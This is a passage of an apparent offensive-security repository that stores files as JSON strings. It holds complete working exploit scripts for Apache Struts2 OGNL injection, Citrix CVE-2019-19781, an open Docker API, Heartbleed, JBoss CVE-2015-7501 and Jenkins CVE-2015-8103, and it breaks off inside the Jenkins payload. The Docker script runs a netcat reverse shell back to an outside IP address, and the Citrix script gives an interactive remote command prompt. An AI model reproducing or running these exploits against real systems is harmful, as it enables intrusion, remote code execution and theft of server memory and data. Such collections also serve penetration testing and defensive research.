Attempts: (%s)\" % (len(injection_points)))\n    attempts_counter = 0\n\n    for injection_point in injection_points:\n        attempts_counter += 1\n        print(\"[%s/%s]\" % (attempts_counter, len(injection_points)))\n        testing_url = \"%s%s\" % (parsed_url[\"site\"], injection_point)\n        testing_url = testing_url.replace(\"{{INJECTION_POINT}}\", \"${{%s*%s}}\" % (random_value, random_value))\n        try:\n            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n        except Exception as e:\n            print(\"EXCEPTION::::--> \" + str(e))\n            continue\n        if \"Location\" in list(resp.headers.keys()):\n            if str(multiplication_value) in resp.headers['Location']:\n                print(\"[*] Status: Vulnerable!\")\n                return(injection_point)\n    print(\"[*] Status: Not Affected.\")\n    return(None)\n\n\ndef exploit(url, cmd):\n    parsed_url = parse_url(url)\n\n    injection_point = check(url)\n    if injection_point is None:\n        print(\"[%] Target is not vulnerable.\")\n        return(0)\n    print(\"[%] Exploiting...\")\n\n    payload = \"\"\"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D\"\"\".format(cmd)\n\n    testing_url = \"%s%s\" % (parsed_url[\"site\"], injection_point)\n    testing_url = testing_url.replace(\"{{INJECTION_POINT}}\", payload)\n\n    try:\n        resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n    except Exception as e:\n        print(\"EXCEPTION::::--> \" + str(e))\n        return(1)\n\n    print(\"[%] Response:\")\n    print(resp.text)\n    return(0)\n\n\ndef main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):\n    if url:\n        if not do_exploit:\n            check(url)\n        else:\n            exploit(url, cmd)\n\n    if usedlist:\n        URLs_List = []\n        try:\n            f_file = open(str(usedlist), \"r\")\n            URLs_List = f_file.read().replace(\"\\r\", \"\").split(\"\\n\")\n            try:\n                URLs_List.remove(\"\")\n            except ValueError:\n                pass\n            f_file.close()\n        except Exception as e:\n            print(\"Error: There was an error in reading list file.\")\n            print(\"Exception: \" + str(e))\n            exit(1)\n        for url in URLs_List:\n            if not do_exploit:\n                check(url)\n            else:\n                exploit(url, cmd)\n\n    print(\"[%] Done.\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)\n    except KeyboardInterrupt:\n        print(\"\\nKeyboardInterrupt Detected.\")\n        print(\"Exiting...\")\n        exit(0)\n",
    "CVE Exploits/Citrix CVE-2019-19781.py": "#!/usr/bin/env python\n# https://github.com/mpgn/CVE-2019-19781\n# # #\n\nimport requests\nimport string\nimport random\nimport re\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nprint(\"CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway\")\nprint(\"Found by Mikhail Klyuchnikov\")\nprint(\"\")\n\nif len(sys.argv) < 2:\n  print(\"[-] No URL provided\")\n  sys.exit(0)\n\nwhile True:\n    try:\n      command = input(\"command > \")\n\n      random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))\n      print(\"[+] Adding bookmark\", random_xml + \".xml\")\n\n      burp0_url = sys.argv[1] + \"/vpn/../vpns/portal/scripts/newbm.pl\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                      random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      burp0_data = {\"url\": \"http://exemple.com\", \"title\": \"[%t=template.new({'BLOCK'='print `\" + str(command) + \"`'})%][ % t % ]\", \"desc\": \"test\", \"UI_inuse\": \"RfWeb\"}\n      r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)\n\n      if r.status_code == 200:\n        print(\"[+] Bookmark added\")\n      else:\n        print(\"\\n[-] Target not vulnerable or something went wrong\")\n        sys.exit(0)\n\n      burp0_url = sys.argv[1] + \"/vpns/portal/\" + random_xml + \".xml\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                       random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      r = requests.get(burp0_url, headers=burp0_headers,verify=False)\n\n      replaced = re.sub('^&#.*&#10;$', '', r.text, flags=re.MULTILINE)\n      print(\"[+] Result of the command: \\n\")\n      print(replaced)\n\n    except KeyboardInterrupt:\n            print(\"Exiting...\")\n            break",
    "CVE Exploits/Docker API RCE.py": "from __future__ import print_function\nimport requests\nimport logging\nimport json\nimport urllib.parse\n\n# NOTE\n# Enable Remote API with the following command\n# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n# This is an intended feature, remember to filter the port 2375..\n\nname          = \"docker\"\ndescription   = \"Docker RCE via Open Docker API on port 2375\"\nauthor        = \"Swissky\"\n\n# Step 1 - Extract id and name from each container\nip   = \"127.0.0.1\"\nport = \"2375\"\ndata = \"containers/json\"\nurl  = \"http://{}:{}/{}\".format(ip, port, data)\nr = requests.get(url)\n\nif r.json:\n    for container in r.json():\n        container_id   = container['Id']\n        container_name = container['Names'][0].replace('/','')\n        print((container_id, container_name))\n\n        # Step 2 - Prepare command\n        cmd = '[\"nc\", \"192.168.1.2\", \"4242\", \"-e\", \"/bin/sh\"]'\n        data = \"containers/{}/exec\".format(container_name)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"AttachStdin\":false,\"AttachStdout\":true,\"AttachStderr\":true, \"Tty\":false, \"Cmd\":'+cmd+' }'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n\n\n        # Step 3 - Execute command\n        id_cmd = r.json()['Id']\n        data = \"exec/{}/start\".format(id_cmd)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"Detach\":false,\"Tty\":false}'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n        print(r)",
    "CVE Exploits/Heartbleed CVE-2014-0160.py": "#!/usr/bin/python\n\n# Quick and dirty demonstration of CVE-2014-0160 originally by Jared Stafford (jspenguin@jspenguin.org)\n# The author disclaims copyright to this source code.\n# Modified by SensePost based on lots of other people's efforts (hard to work out credit via PasteBin)\n\nfrom __future__ import print_function\nfrom builtins import str\nfrom builtins import range\nimport sys\nimport struct\nimport socket\nimport time\nimport select\nimport re\nfrom optparse import OptionParser\nimport smtplib\n\noptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\noptions.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')\noptions.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')\noptions.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')\noptions.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')\noptions.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS (smtp only right now)')\n\ndef h2bin(x):\n\treturn x.replace(' ', '').replace('\\n', '').decode('hex')\n\nhello = h2bin('''\n16 03 02 00  dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n00 0f 00 01 01\n''')\n\nhbv10 = h2bin('''\n18 03 01 00 03\n01 40 00\n''')\n\nhbv11 = h2bin('''\n18 03 02 00 03\n01 40 00\n''')\n\nhbv12 = h2bin('''\n18 03 03 00 03\n01 40 00\n''')\n\ndef hexdump(s, dumpf, quiet):\n\tdump = open(dumpf,'a')\n\tdump.write(s)\n\tdump.close()\n\tif quiet: return\n\tfor b in range(0, len(s), 16):\n\t\tlin = [c for c in s[b : b + 16]]\n\t\thxdat = ' '.join('%02X' % ord(c) for c in lin)\n\t\tpdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n\t\tprint('  %04x: %-48s %s' % (b, hxdat, pdat))\n\tprint()\n\ndef recvall(s, length, timeout=5):\n\tendtime = time.time() + timeout\n\trdata = ''\n\tremain = length\n\twhile remain > 0:\n\t\trtime = endtime - time.time()\n\t\tif rtime < 0:\n\t\t\tif not rdata:\n\t\t\t\treturn None\n\t\t\telse:\n\t\t\t\treturn rdata\n\t\tr, w, e = select.select([s], [], [], 5)\n\t\tif s in r:\n\t\t\tdata = s.recv(remain)\n\t\t\t# EOF?\n\t\t\tif not data:\n\t\t\t\treturn None\n\t\t\trdata += data\n\t\t\tremain -= len(data)\n\treturn rdata\n\ndef recvmsg(s):\n\thdr = recvall(s, 5)\n\tif hdr is None:\n\t\tprint('Unexpected EOF receiving record header - server closed connection')\n\t\treturn None, None, None\n\ttyp, ver, ln = struct.unpack('>BHH', hdr)\n\tpay = recvall(s, ln, 10)\n\tif pay is None:\n\t\tprint('Unexpected EOF receiving record payload - server closed connection')\n\t\treturn None, None, None\n\tprint(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))\n\treturn typ, ver, pay\n\ndef hit_hb(s, dumpf, host, quiet):\n\twhile True:\n\t\ttyp, ver, pay = recvmsg(s)\n\t\tif typ is None:\n\t\t\tprint('No heartbeat response received from '+host+', server likely not vulnerable')\n\t\t\treturn False\n\n\t\tif typ == 24:\n\t\t\tif not quiet: print('Received heartbeat response:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tif len(pay) > 3:\n\t\t\t\tprint('WARNING: server '+ host +' returned more data than it should - server is vulnerable!')\n\t\t\telse:\n\t\t\t\tprint('Server '+host+' processed malformed heartbeat, but did not return any extra data.')\n\t\t\treturn True\n\n\t\tif typ == 21:\n\t\t\tif not quiet: print('Received alert:')\n\t\t\thexdump(pay, dumpf, quiet)\n\t\t\tprint('Server '+ host +' returned error, likely not vulnerable')\n\t\t\treturn False\n\ndef connect(host, port, quiet):\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\tif not quiet: print('Connecting...')\n\tsys.stdout.flush()\n\ts.connect((host, port))\n\treturn s\n\ndef tls(s, quiet):\n\tif not quiet: print('Sending Client Hello...')\n\tsys.stdout.flush()\n\ts.send(hello)\n\tif not quiet: print('Waiting for Server Hello...')\n\tsys.stdout.flush()\n\ndef parseresp(s):\n\twhile True:\n\t\ttyp, ver, pay = recvmsg(s)\n\t\tif typ == None:\n\t\t\tprint('Server closed connection without sending Server Hello.')\n\t\t\treturn 0\n\t\t# Look for server hello done message.\n\t\tif typ == 22 and ord(pay[0]) == 0x0E:\n\t\t\treturn ver\n\ndef check(host, port, dumpf, quiet, starttls):\n\tresponse = False\n\tif starttls:\n\t\ttry:\n\t\t\ts = smtplib.SMTP(host=host,port=port)\n\t\t\ts.ehlo()\n\t\t\ts.starttls()\n\t\texcept smtplib.SMTPException:\n\t\t\tprint('STARTTLS not supported...')\n\t\t\ts.quit()\n\t\t\treturn False\n\t\tprint('STARTTLS supported...')\n\t\ts.quit()\n\t\ts = connect(host, port, quiet)\n\t\ts.settimeout(1)\n\t\ttry:\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('ehlo starttlstest\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('starttls\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\texcept socket.timeout:\n\t\t\tprint('Timeout issues, going ahead anyway, but it is probably broken ...')\n\t\ttls(s,quiet)\n\telse:\n\t\ts = connect(host, port, quiet)\n\t\ttls(s,quiet)\n\n\tversion = parseresp(s)\n\n\tif version == 0:\n\t\tif not quiet: print(\"Got an error while parsing the response, bailing ...\")\n\t\treturn False\n\telse:\n\t\tversion = version - 0x0300\n\t\tif not quiet: print(\"Server TLS version was 1.%d\\n\" % version)\n\n\tif not quiet: print('Sending heartbeat request...')\n\tsys.stdout.flush()\n\tif (version == 1):\n\t\ts.send(hbv10)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 2):\n\t\ts.send(hbv11)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 3):\n\t\ts.send(hbv12)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\ts.close()\n\treturn response\n\ndef main():\n\topts, args = options.parse_args()\n\tif len(args) < 1:\n\t\toptions.print_help()\n\t\treturn\n\n\tprint('Scanning ' + args[0] + ' on port ' + str(opts.port))\n\tfor i in range(0,opts.num):\n\t\tcheck(args[0], opts.port, opts.file, opts.quiet, opts.starttls)\n\nif __name__ == '__main__':\n\tmain()\n",
    "CVE Exploits/JBoss CVE-2015-7501.py": "#! /usr/bin/env python2\n\n# Jboss Java Deserialization RCE (CVE-2015-7501)\n# Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys, os\n#from binascii import hexlify, unhexlify\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif ysoserial_path is None:\n    print('[-] Could not find ysoserial JAR file')\n    sys.exit(1)\n\nif len(args.target.split(\":\")) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\ngadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', args.command])\n\nr = requests.post('{}://{}:{}/invoker/JMXInvokerServlet'.format(args.proto, ip, port), verify=False, data=gadget)\n\nif r.status_code == 200:\n    print('[+] Command executed successfully')\n\n",
    "CVE Exploits/Jenkins CVE-2015-8103.py": "#! /usr/bin/env python2\n\n#Jenkins CLI RMI Java Deserialization RCE (CVE-2015-8103)\n#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits)\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport socket\nimport sys\nimport base64\nimport argparse\nimport os\nfrom subprocess import check_output\n\nysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']\nysoserial_path = None\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\nparser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif not args.ysoserial_path:\n    for path in ysoserial_default_paths:\n        if os.path.exists(path):\n            ysoserial_path = path\nelse:\n    if os.path.exists(args.ysoserial_path):\n        ysoserial_path = args.ysoserial_path\n\nif ysoserial_path is None:\n    print(\"[-] Could not find ysoserial JAR file\")\n    sys.exit(1)\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nhost, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(host))\nprint('[*] Target PORT: {}'.format(port))\nprint('\\n')\n\nprint('[*] Retrieving the Jenkins CLI port')\n#Query Jenkins over HTTP to find what port the CLI listener is on\nr = requests.get('{}://{}:{}'.format(args.proto, host, port))\ncli_port = int(r.headers['X-Jenkins-CLI-Port'])\n\n#Open a socket to the CLI port\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (host, cli_port)\nprint('[*] Connecting to Jenkins CLI on {}:{}'.format(host, cli_port))\nsock.connect(server_address)\n\n# Send headers\nheaders='\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74'\nprint('[*] Sending headers')\nsock.send(headers)\n\ndata = sock.recv(1024)\nprint('[*] Received \"{}\"'.format(data))\n\nif data.find('JENKINS REMOTING CAPACITY') == -1:\n    data = sock.recv(1024)\n    print('[*] Received \"{}\"'.format(data))\n\npayloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections3', args.command])\npayload_b64 = base64.b64encode(payloadObj)\npayload='\\x3c\\x3d\\x3d\\x3d\\x5b\\x4a\\x45\\x4e\\x4b\\x49\\x4e\\x53\\x20\\x52\\x45\\x4d\\x4f\\x54\\x49\\x4e\\x47\\x20\\x43\\x41\\x50\\x41\\x43\\x49\\x54\\x59\\x5d\\x3d\\x3d\\x3d\\x3e'+payload_b64+'\\x00\\x00\\x00\\x00\\x11\\x2d\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x4c\\x00\\x10\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x74\\x00\\x30\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x3b\\x5b\\x00\\x07\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x02\\x5b\\x42\\x4c\\x00\\x08\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x09\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x41\\x74\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x3b\\x78\\x70\\x73\\x72\\x00\\x1e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x24\\x53\\x6f\\x75\\x72\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x06\\x74\\x68\\x69\\x73\\x24\\x30\\x74\\x00\\x19\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x71\\x00\\x7e\\x00\\x03\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00\\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x78\\x70\\x71\\x00\\x7e\\x00\\x10\\x70\\x75\\x72\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02\\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x0c\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x04\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x00\\x00\\x00\\x43\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x74\\x00\\x0c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x32\\x71\\x00\\x7e\\x00\\x15\\x71\\x00\\x7e\\x00\\x16\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x63\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x0c\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x3c\\x74\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x10\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x03\\x08\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x74\\x00\\x0c\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x04\\x63\\x61\\x6c\\x6c\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xfa\\x74\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x74\\x00\\x1c\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x24\\x50\\x72\\x6f\\x78\\x79\\x31\\x70\\x74\\x00\\x0f\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x74\\x00\\x15\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x52\\x65\\x6d\\x6f\\x74\\x65\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x74\\x00\\x0e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x74\\x00\\x08\\x43\\x4c\\x49\\x2e\\x6a\\x61\\x76\\x61\\x7